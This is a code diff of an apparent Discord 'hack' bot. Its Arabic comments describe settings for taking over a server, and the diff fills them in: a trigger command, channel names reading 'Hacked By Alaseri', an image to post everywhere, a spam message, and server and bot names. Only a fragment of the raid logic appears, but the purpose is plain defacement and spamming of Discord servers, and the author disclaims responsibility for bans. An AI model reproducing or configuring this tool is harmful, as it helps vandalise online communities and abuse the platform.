@@ -12,14 +12,14 @@ client.on('message', message => {
 });
 
 //انا لا اتحمل مسؤولية اي باند يجيك من سيرفر او من دسكورد نفسه
-const Token = "1" //هنا توكن البوت اللي بتشغل عليه الهاك
-const x_x = "" //هنا تحط الامر اللي يشغل الهاك
-const teext = "" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
-const vooice = "" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
-const pic = "" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
-const spam = "" //هنا تحط وش تبي رسالة السبام
-const namee = "" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
-const playing = "" //هنا تحط وش تبي يكون الستريمنق
+const Token = "t" //هنا توكن البوت اللي بتشغل عليه الهاك
+const x_x = "open" //هنا تحط الامر اللي يشغل الهاك
+const teext = "Hacked By Alaseri" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
+const vooice = "Hacked By Alaseri" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
+const pic = "https://b.top4top.net/p_1039g95wa1.jpg" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
+const spam = "Hacked" //هنا تحط وش تبي رسالة السبام
+const namee = "Alaseri Is Here" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
+const playing = "Hacked By Alaseri" //هنا تحط وش تبي يكون الستريمنق
 client.on('message', message => {
 if (message.content === x_x) {
 	var teeext = teext.replace(" ", "-")
